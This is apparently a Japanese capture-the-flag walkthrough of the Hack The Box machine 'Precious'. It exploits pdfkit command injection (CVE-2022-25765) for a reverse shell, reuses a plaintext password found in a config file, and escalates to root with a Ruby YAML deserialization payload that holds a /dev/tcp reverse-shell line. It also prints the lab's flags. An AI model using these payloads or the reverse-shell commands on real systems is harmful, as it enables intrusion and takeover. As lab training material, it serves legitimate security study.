https://app.hackthebox.com/machines/Precious

## STEP 1
```sh
└─$ rustscan -a 10.129.228.98 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.98:22
Open 10.129.228.98:80
10.129.228.98 -> [22,80]
```


## STEP 2
80番にアクセス、「precious.htb」にリダイレクトされたので名前解決できない  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_01.png">  
hostsを編集
```sh
└─$ echo '10.129.228.98 precious.htb' | sudo tee -a /etc/hosts
```
アクセスできた、urlを入力できるっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_02.png">  
試しに「hxxp://127.0.0.1」を入力したらエラーが出た  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_03.png">  
今度はkaliでpythonでwebサーバをたてて確認させる
```sh
└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
pdfが自動でダウンロードされた、実際にkaliでたてたwebサーバのキャプチャになっている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_04.png">  
ダウンロードされたpdfの情報を確認すると、pdfkitで作成されているっぽい
```sh
└─$ exiftool Downloads/muzjrzs750ms8sopaxtjok1iojlb19li.pdf 
ExifTool Version Number         : 13.25
File Name                       : muzjrzs750ms8sopaxtjok1iojlb19li.pdf
Directory                       : Downloads
File Size                       : 38 kB
File Modification Date/Time     : 2025:07:02 08:40:05-04:00
File Access Date/Time           : 2025:07:02 08:40:05-04:00
File Inode Change Date/Time     : 2025:07:02 08:40:05-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Generated by pdfkit v0.8.6
```
pdfkit v8.0.6 には、CVE-2022-25765のrceの脆弱性があるらしい  
[PoC](https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765)でエクスプロイト
```sh
└─$ wget https://raw.githubusercontent.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765/refs/heads/main/CVE-2022-25765.py
--2025-07-02 08:53:48--  https://raw.githubusercontent.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765/refs/heads/main/CVE-2022-25765.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1582 (1.5K) [text/plain]
Saving to: ‘CVE-2022-25765.py’

CVE-2022-25765.py                                          100%[========================================================================================================================================>]   1.54K  --.-KB/s    in 0s      

2025-07-02 08:53:49 (38.4 MB/s) - ‘CVE-2022-25765.py’ saved [1582/1582]

└─$ python3.13 CVE-2022-25765.py -t http://precious.htb -a 10.10.16.4 -p 4444
[*] Input target address is http://precious.htb
[*] Input address for reverse connect is 10.10.16.4
[*] Input port is 4444
[!] Run the shell... Press Ctrl+C after successful connection
^CTraceback (most recent call last):
```
リバースシェル取得！がユーザフラグすら権限拒否
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 44794
bash: cannot set terminal process group (677): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)

ruby@precious:/var/www/pdfapp$ cat /home/henry/user.txt
cat /home/henry/user.txt
cat: /home/henry/user.txt: Permission denied
```


## STEP 3
謎のconfigファイルにhenryのパスワードらしいものを発見  
henryにログイン成功！ユーザフラグゲット！
```sh
ruby@precious:/var/www/pdfapp$ cat /home/ruby/.bundle/config
cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

ruby@precious:/var/www/pdfapp$ su henry
su henry
Password: Q3c1AqGHtoI0aXAYFH

id
uid=1000(henry) gid=1000(henry) groups=1000(henry)

SHELL=/bin/bash script -q /dev/null
henry@precious:/var/www/pdfapp$

henry@precious:/var/www/pdfapp$ cat /home/henry/user.txt
cat /home/henry/user.txt
e3948152e2e4cd28f2c967ffcc412a53
```


## STEP 4
パスワードなしでroot権限でrubyを実行できそう
```sh
henry@precious:/var/www/pdfapp$ sudo -l
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
「/opt/update_dependencies.rb」を確認  
dependencies.ymlの中身は
```yaml
rails: "6.1.4"
rake: "13.0.6"
```
のようなバージョンが書いてあると仮定し  
dependencies.yml内のバージョンと、実際にインストールされているバージョンを比較するスクリプトっぽい
```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
が、Ruby3.1以前は`YAML.load()`でyamlを読み込むとReserializationしてそこからコマンド実行の脆弱性があるらしい（CVE-2022-32224）  
またdependencies.ymlは絶対パスでないため、カレントディレクトリ内の攻撃者のyaml経由でコマンド実行できる  
[PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)があるので、git_setでリバースシェルコマンドに編集
```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash -c "bash -i >& /dev/tcp/10.10.16.4/5555 0>&1"
         method_id: :resolve
```
dependencies.ymlダウンロードし、実行
```sh
henry@precious:~$ cd /home/henry
cd /home/henry

henry@precious:~$ wget http://10.10.16.4/dependencies.yml
wget http://10.10.16.4/dependencies.yml
--2025-07-02 10:08:12--  http://10.10.16.4/dependencies.yml
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 667 [application/yaml]
Saving to: ‘dependencies.yml’

     0K                                                       100%  119M=0s

2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]

henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```
リバースシェル取得！ルートフラグゲット！
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 50478
root@precious:/home/henry# id
id
uid=0(root) gid=0(root) groups=0(root)

root@precious:/home/henry# cat /root/root.txt
cat /root/root.txt
6afa1a7ac857a74c60f00f3f28d18f32
```


## おまけ
ちなみに、PoCのyamlを逆serializationした模倣rubyをチャットGPTさんに聞いてみました
```ruby
require 'rubygems'
require 'yaml'
require 'net/http'

# 実際に呼び出される可能性のあるRubyコード（再現）

# ① system("/bin/bash") を実行するための構造
# ↓この Net::WriteAdapter は Kernel に system を送る
inner_adapter = Net::WriteAdapter.new(Kernel, :system)

# ② GitSet として `/bin/bash` を持っているリクエストセット
request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, inner_adapter)
request_set.instance_variable_set(:@git_set, "/bin/bash")

# ③ 外側の adapter が `resolve` メソッドを呼ぶと → request_set.system("/bin/bash")
outer_adapter = Net::WriteAdapter.new(request_set, :resolve)

# ④ Net::BufferedIO の debug_output に outer_adapter を渡す
buffered_io = Net::BufferedIO.new(StringIO.new(""))
buffered_io.instance_variable_set(:@debug_output, outer_adapter)

# ⑤ buffered_io.debug_output.method_id == :resolve
# ⑥ buffered_io.debug_output.socket → request_set
# ⑦ request_set.sets = Net::WriteAdapter(socket: Kernel, method_id: :system)
# ⑧ request_set.git_set = "/bin/bash"
# ↓
# resolve() を呼ぶと内部で次が実行される
buffered_io.debug_output.socket.sets.send(
  buffered_io.debug_output.socket.sets.instance_variable_get(:@method_id),
  buffered_io.debug_output.socket.git_set
)

# ↑ 実際にはこれが以下のように展開される：
# Kernel.send(:system, "/bin/bash")
```
